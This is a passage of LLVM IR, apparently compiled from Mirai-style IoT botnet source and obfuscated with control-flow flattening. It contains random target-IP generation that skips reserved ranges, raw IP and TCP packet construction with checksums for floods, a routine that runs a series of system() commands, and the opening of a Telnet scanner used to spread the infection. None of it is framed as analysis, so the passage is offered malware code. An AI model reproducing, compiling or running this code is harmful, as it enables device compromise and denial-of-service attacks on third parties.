  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %71, 32
  %73 = select i1 %72, i32 1638489415, i32 -1158903532
  store i32 %73, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 100
  %78 = select i1 %77, i32 -1054665292, i32 -2132908362
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sge i32 %81, 64
  %83 = select i1 %82, i32 432949723, i32 -2132908362
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp slt i32 %86, 127
  %88 = select i1 %87, i32 1638489415, i32 -2132908362
  store i32 %88, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 169
  %93 = select i1 %92, i32 856741893, i32 -288802963
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp sgt i32 %96, 254
  %98 = select i1 %97, i32 1638489415, i32 -288802963
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 198
  %103 = select i1 %102, i32 229001636, i32 -977772064
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp sge i32 %106, 18
  %108 = select i1 %107, i32 9668823, i32 -977772064
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %111, 20
  %113 = select i1 %112, i32 1638489415, i32 -977772064
  store i32 %113, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 224
  %118 = select i1 %117, i32 1638489415, i32 1623052291
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 6
  %123 = select i1 %122, i32 -1375156790, i32 -1750181803
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 7
  %128 = select i1 %127, i32 -1375156790, i32 -988574542
  store i32 %128, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 11
  %133 = select i1 %132, i32 -1375156790, i32 435131103
  store i32 %133, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 21
  %138 = select i1 %137, i32 -1375156790, i32 -1412739323
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 22
  %143 = select i1 %142, i32 -1375156790, i32 -1100252599
  store i32 %143, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 26
  %148 = select i1 %147, i32 -1375156790, i32 1120793661
  store i32 %148, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 28
  %153 = select i1 %152, i32 -1375156790, i32 -537081665
  store i32 %153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 29
  %158 = select i1 %157, i32 -1375156790, i32 1959757981
  store i32 %158, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 30
  %163 = select i1 %162, i32 -1375156790, i32 -550182426
  store i32 %163, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 33
  %168 = select i1 %167, i32 -1375156790, i32 1689220816
  store i32 %168, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 55
  %173 = select i1 %172, i32 -1375156790, i32 2124528067
  store i32 %173, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 214
  %178 = select i1 %177, i32 -1375156790, i32 672927328
  store i32 %178, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 215
  store i32 -1375156790, i32* %switchVar
  store i1 %182, i1* %.reg2mem
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 1638489415, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %185 = select i1 %.reload3, i32 561548015, i32 -828496409
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = call i32 @rand() #5
  %188 = srem i32 %187, 223
  %189 = trunc i32 %188 to i8
  store i8 %189, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %190 = call i32 @rand() #5
  %191 = srem i32 %190, 255
  %192 = trunc i32 %191 to i8
  store i8 %192, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %193 = call i32 @rand() #5
  %194 = srem i32 %193, 255
  %195 = trunc i32 %194 to i8
  store i8 %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %196 = call i32 @rand() #5
  %197 = srem i32 %196, 255
  %198 = trunc i32 %197 to i8
  store i8 %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  store i32 1811017608, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 16, i32 16, i1 false)
  %201 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %202 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %203 = zext i8 %202 to i32
  %204 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %205 = zext i8 %204 to i32
  %206 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %207 = zext i8 %206 to i32
  %208 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %209 = zext i8 %208 to i32
  %210 = call i32 (i8*, i8*, ...) @szprintf(i8* %201, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.473, i32 0, i32 0), i32 %203, i32 %205, i32 %207, i32 %209)
  %211 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %212 = call i32 @inet_addr(i8* %211) #5
  ret i32 %212

loopEnd:                                          ; preds = %186, %184, %183, %179, %174, %169, %164, %159, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 1369447456, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1369447456, label %6
    i32 -642127001, label %10
    i32 1324072360, label %19
    i32 469873045, label %23
    i32 856073627, label %30
    i32 647327101, label %31
    i32 -734615838, label %36
    i32 -1932428478, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -642127001, i32 1324072360
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 1369447456, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 469873045, i32 856073627
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 856073627, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 647327101, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 -734615838, i32 -1932428478
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 647327101, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -542093502, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -542093502, label %first
    i32 -1908159856, label %7
    i32 1965922256, label %8
    i32 806545089, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 -1908159856, i32 1965922256
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 806545089, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 806545089, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.474, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.475, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.476, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.477, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.478, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.479, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.480, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.481, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.482, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.483, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.484, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.485, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.486, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %.reg2mem138 = alloca i32
  %.reg2mem20 = alloca %struct.telstate_t*
  %.reg2mem18 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  store i32 %27, i32* %.reg2mem
  %28 = load i32, i32* %4, align 4
  store i32 %28, i32* %.reg2mem18
  %switchVar = alloca i32
  store i32 -394590432, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar17 = load i32, i32* %switchVar
  switch i32 %switchVar17, label %switchDefault [
    i32 -394590432, label %first
    i32 1268815577, label %31
    i32 1879365158, label %33
    i32 -868841946, label %49
    i32 1577477531, label %54
    i32 67734208, label %68
    i32 300706276, label %71
    i32 -150514707, label %72
    i32 1844271184, label %73
    i32 1847016220, label %74
    i32 54377381, label %79
    i32 1658938026, label %87
    i32 563386705, label %94
    i32 1673681324, label %NodeBlock15
    i32 1242133823, label %NodeBlock13
    i32 1840688043, label %NodeBlock11
    i32 934221455, label %NodeBlock9
    i32 1903913161, label %LeafBlock7
    i32 -1314589508, label %NodeBlock5
    i32 220787894, label %NodeBlock3
    i32 1020078040, label %NodeBlock1
    i32 1683881422, label %NodeBlock
    i32 -1334814984, label %LeafBlock
    i32 876700100, label %111
    i32 1887578959, label %120
    i32 -1684042464, label %140
    i32 722636225, label %149
    i32 -1468988545, label %170
    i32 -895961323, label %175
    i32 232752200, label %184
    i32 -1120220925, label %189
    i32 -379042933, label %190
    i32 655837451, label %191
    i32 -6618673, label %216
    i32 924843398, label %217
    i32 -1526372519, label %240
    i32 -219208848, label %245
    i32 -2107535376, label %249
    i32 645889333, label %253
    i32 1452039364, label %254
    i32 1341604381, label %255
    i32 675480794, label %264
    i32 883621267, label %265
    i32 -416109397, label %299
    i32 -287908340, label %314
    i32 1943163349, label %318
    i32 1214024859, label %335
    i32 -798317049, label %336
    i32 -2070728837, label %340
    i32 1211046979, label %344
    i32 -108756672, label %345
    i32 140246675, label %356
    i32 42623743, label %360
    i32 -1804144683, label %361
    i32 78851137, label %376
    i32 139742893, label %391
    i32 1783758383, label %395
    i32 1443358615, label %399
    i32 -74078779, label %400
    i32 -745162783, label %411
    i32 704648681, label %415
    i32 -1126487820, label %416
    i32 -1871009794, label %442
    i32 -1694285390, label %446
    i32 -368570665, label %455
    i32 422501581, label %459
    i32 1953137853, label %463
    i32 -395404207, label %478
    i32 1957289215, label %493
    i32 -945299864, label %497
    i32 -2042002933, label %501
    i32 886563210, label %502
    i32 1909638705, label %513
    i32 -687647990, label %517
    i32 -1993409231, label %518
    i32 -1141881978, label %544
    i32 -435148952, label %548
    i32 -58018858, label %557
    i32 1442086622, label %561
    i32 -229129173, label %565
    i32 -1955352274, label %580
    i32 -713636450, label %595
    i32 -1390149147, label %599
    i32 -2103343836, label %608
    i32 204049139, label %617
    i32 -1041077727, label %621
    i32 -1940903272, label %647
    i32 465081992, label %648
    i32 -700124276, label %652
    i32 817357565, label %653
    i32 -648443220, label %654
    i32 -101774770, label %665
    i32 2145671028, label %669
    i32 2035229503, label %670
    i32 674379239, label %684
    i32 -273406477, label %688
    i32 -836553590, label %724
    i32 1810600987, label %728
    i32 -2090721774, label %754
    i32 1773745127, label %769
    i32 -467540584, label %770
    i32 -59161709, label %779
    i32 -1118689689, label %780
    i32 1991579514, label %792
    i32 777164503, label %796
    i32 1357767157, label %833
    i32 -1213951192, label %842
    i32 1865900719, label %851
    i32 -936275321, label %882
    i32 -124092549, label %883
    i32 -1465130461, label %894
    i32 1711808489, label %903
    i32 1786898711, label %926
    i32 972797272, label %930
    i32 2113152832, label %NewDefault
    i32 1015336728, label %931
    i32 -854067751, label %932
    i32 1204835284, label %935
    i32 1491888089, label %936
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
